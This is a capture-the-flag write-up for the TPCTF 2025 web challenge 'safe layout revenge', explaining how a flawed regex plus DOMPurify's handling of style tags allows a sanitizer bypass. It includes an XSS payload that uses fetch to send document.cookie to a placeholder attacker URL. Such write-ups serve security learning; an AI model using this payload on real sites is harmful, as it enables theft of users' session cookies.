---
title: "safe layout revenge - TPCTF 2025"
category: "web"
type: "writeup"
tags: ["html", "dompurify", "web", "regex", "safe", "layout", "revenge", "tpctf", "tpctf-2025", "2025", "ctf-writeup"]
summary: "Tips: You can use Dom-Explorer to see DOMPurify output."
source:
  name: "CTFtime writeup #40071"
  url: "https://ctftime.org/writeup/40071"
original_source: "https://ouuan.moe/post/2025/03/tpctf-2025#safe-layout-revenge-29-solves"
ctf:
  name: "TPCTF 2025"
  year: 2025
  challenge: "safe layout revenge"
---

## Metadata

- **CTF:** TPCTF 2025
- **Task:** safe layout revenge
- **Author team:** TP-Link
- **CTFtime tags:** html, dompurify, web
- **CTFtime:** <https://ctftime.org/writeup/40071>
- **Original writeup:** <https://ouuan.moe/post/2025/03/tpctf-2025#safe-layout-revenge-29-solves>

---
Tips: You can use [Dom-Explorer](<https://yeswehack.github.io/Dom-Explorer/>) to see DOMPurify output. It’s a great tool for playing with mXSS and sanitizers.

We need to get a malicious tag without using attributes. Normally, malicious tags will be either removed or escaped, but we can get unescaped angle brackets in `<style>`. DOMPurify is very strict and any HTML tags in `<style>` will be filtered. However, the regular expression only checks for `/<[/\w]/`, so `<{{content}}` will not be filtered and can be used to get malicious tags.

Here the inner payload is used twice, first to close the `<style>` tag and then to create the `` tag:

```html  
a<style>{{content}}<{{content}}</style>  
```

```html  
img src onerror=fetch(`{YOUR_URL}/`+document.cookie) <style></style>  
```

Another solution is similar but uses an empty `{{content}}`, like [CVE-2023-48219](<https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#cve-2023-48219-tinymce>).
